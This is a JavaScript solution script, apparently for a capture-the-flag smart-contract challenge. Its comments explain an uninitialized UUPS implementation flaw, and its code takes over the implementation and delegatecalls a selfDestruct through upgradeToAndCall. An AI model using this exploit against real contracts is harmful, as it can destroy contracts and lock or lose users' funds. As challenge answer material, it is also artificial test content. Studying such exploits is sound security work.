
// reading about UUPS upgradeable contracts:
// "always initialize your implementation!"
// alright, initialize? but is it not being initialized...?
// oh well xD
//
// the main point is that delegating the initialize call
// is not the same as actually initializing the implementation
// contract.
// in this case, the proxy contract is initialized with the
// implementation's logic, but the actual implementation
// contract's initialize() is never called.
// even though we can't edit the proxy storage by calling
// its initializer directly, we can edit its storage and
// get upgrade permission. again, we can't edit the proxy
// storage, so we can't edit the implementation address, but
// we do get an arbitrary delegatecall. we can use that to
// solve the challenge by delegating a call to a function
// that selfdestructs the contract.

const implementationSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
const engineAddr = (await web3.eth.getStorageAt(contract.address, implementationSlot)).slice(-40);

const Engine = new web3.eth.Contract([
    {
        "inputs": [],
        "name": "horsePower",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "initialize",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "newImplementation",
                "type": "address"
            },
            {
                "internalType": "bytes",
                "name": "data",
                "type": "bytes"
            }
        ],
        "name": "upgradeToAndCall",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "upgrader",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
], engineAddr);

await Engine.methods.initialize().send({ from: player });

const exploitAddr = "0x5cfCcF68b61E3e152A4adD343BD184f09D30E3DB";

await Engine.methods.upgradeToAndCall(exploitAddr, web3.eth.abi.encodeFunctionCall({
    "inputs": [
        {
            "internalType": "address payable",
            "name": "receiver",
            "type": "address"
        }
    ],
    "name": "selfDestruct",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}, [player])).send({ from: player });
